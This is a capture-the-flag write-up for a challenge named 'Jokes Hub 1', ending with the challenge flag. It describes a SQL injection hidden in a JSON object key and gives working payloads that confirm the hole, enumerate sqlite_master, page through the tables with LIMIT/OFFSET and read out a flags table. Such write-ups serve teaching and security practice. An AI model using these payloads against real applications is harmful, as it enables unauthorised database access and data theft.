# Jokes Hub 1

## Write-up

- Basic SQL injection in the key of the object sent.

```json
{"'1' -- ":5}
```
- We'll get the following results:

```json
{"result":"1"}
```
- You can now enumerate the DB, after finding that is sqlite, you can list all the tables like this:
```json
{"sql from sqlite_master -- ":5}
```
- This will give the first table created which is `jokes`, to get the other tables just use `limit` and `offset`

```
{"sql from sqlite_master LIMIT 1 OFFSET 2 -- ":5}
```
- With this we get the table named flags withm column flag which contains the flag:
```json
{"flag from flags -- ":5}
```

## Flag

`shellmates{ar3_sqli_still_4_THing?}`